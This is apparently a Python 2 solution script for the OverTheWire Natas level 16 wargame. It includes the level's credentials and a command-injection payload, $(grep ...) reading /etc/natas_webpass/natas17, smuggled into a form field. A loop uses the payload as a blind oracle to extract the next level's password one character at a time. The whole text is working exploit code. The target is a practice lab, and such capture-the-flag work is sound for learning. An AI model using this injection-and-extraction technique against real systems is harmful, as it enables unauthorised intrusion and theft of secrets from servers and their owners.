payload = "$(grep -E ^%s.* /etc/natas_webpass/natas17)African"
user = 'natas16'
pw = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

import requests
from requests.auth import HTTPBasicAuth
import string
keys = string.lowercase + string.uppercase + string.digits

passw = ""
while True:
    for x in keys:
        data = {'needle': payload % (passw+x)}
        url = 'http://natas16.natas.labs.overthewire.org/'
        r = requests.post(url, auth=HTTPBasicAuth(user, pw), data=data)

        if 'African' not in r.text:
            passw = passw+x
            break
    print passw

